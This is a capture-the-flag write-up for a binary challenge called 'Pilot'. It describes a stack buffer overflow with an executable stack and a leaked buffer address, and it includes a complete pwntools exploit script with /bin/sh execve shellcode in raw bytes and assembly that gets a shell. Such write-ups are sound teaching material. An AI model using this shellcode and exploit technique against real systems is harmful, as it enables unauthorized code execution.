# Pilot (pwn)

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/3b8098fc-3eae-4c84-a685-e70b03958bf2)  

Since there are no binary security measures enabled, the only thing we have to worry about is ASLR.  
Remember that ASLR is a Kernel level security and is independent of the binary.  

Running the program seems to be a DropShipping simulator, it prints something that looks like a stack address and then asks for a command.
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/e622dcd7-d282-4101-818b-9d2c07736c58)

Let's look at the binary in Ghidra

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/18d81087-9de9-4bd7-ab60-d454360d757f)  

C++, absolutely disgusting :(  

I'll point your attention to the important parts:
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/8930f563-dbf6-4d60-80f8-e29eb9db46fa)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/9233a216-242d-4556-bd64-8519ac86df08)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/b3664a55-f8b8-44c0-8389-e886b4d1a019)  

So we have a buffer overflow, and the address that is printed for us is the address of our buffer.  

## Exploitation

Using GDB I determined that the offset between the beginning of the buffer and the return address was 40 bytes  
Therefore our exploit looks like the following:
`[ Shellcode | Padding until return address | Buffer Addr ]`  

Why?  
Since NX is disabled that means that the Stack is marked as executable.  
Therefore we can write assembly instructions into the stack and then redirect execution to them to execute arbitrary code.  

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pilot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pilot')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()
'''
push rax
xor rdx, rdx
xor rsi, rsi
movabs rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 0x3b
syscall
'''
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
print(len(shellcode))
padding = (40-len(shellcode)) * b'A'

io.recvuntil(b'Location:')
buf_addr = io.recvline()[:-1]
print(buf_addr)
buf_addr = int(buf_addr,16)

payload = shellcode + padding + p64(buf_addr)

io.sendline(payload)
io.interactive()
```
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/2ffe5ed9-72a2-44cb-9db9-3115786e9545)


